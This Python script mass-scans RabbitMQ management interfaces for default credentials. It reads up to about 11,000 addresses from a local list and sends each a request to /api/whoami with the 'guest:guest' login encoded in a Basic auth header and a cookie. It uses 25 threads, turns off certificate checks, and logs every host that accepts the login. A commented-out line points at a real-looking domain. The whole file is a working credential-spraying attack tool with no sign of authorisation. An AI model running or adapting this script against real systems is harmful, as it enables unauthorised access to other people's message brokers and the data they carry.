import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path = Path(__file__).resolve().parent
result_path = file_path/'result'/f'{filename}.txt'


def exploit(ip_, index):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',
            'Referer': ip_,
            'Cookie': 'm=2258:Z3Vlc3Q6Z3Vlc3Q%253D',
            'content-type': 'application/json',
            'authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q=',
        }
        url = ip_+'/api/whoami'
        # print(index,url)
        res = requests.get(url, headers=headers, timeout=8, verify=False)
        if res.status_code != 200:
            return
        print(res, len(res.text))
        print(index, ip_)
        # print(res.text)
        with result_path.open('a+') as file:
            file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass


# url = 'http://bzgx.yuyiying.com:15672'
# exploit(url, 1)


threads = []
with open(r'D:\Downloads\tmp\rabbitmq.txt', 'r') as file:
    # with open(r'nfs.txt', 'r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 0
        end = start+11000

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 25
# print(urls)

test = 'm'


if test == 't':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test == 'm':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()
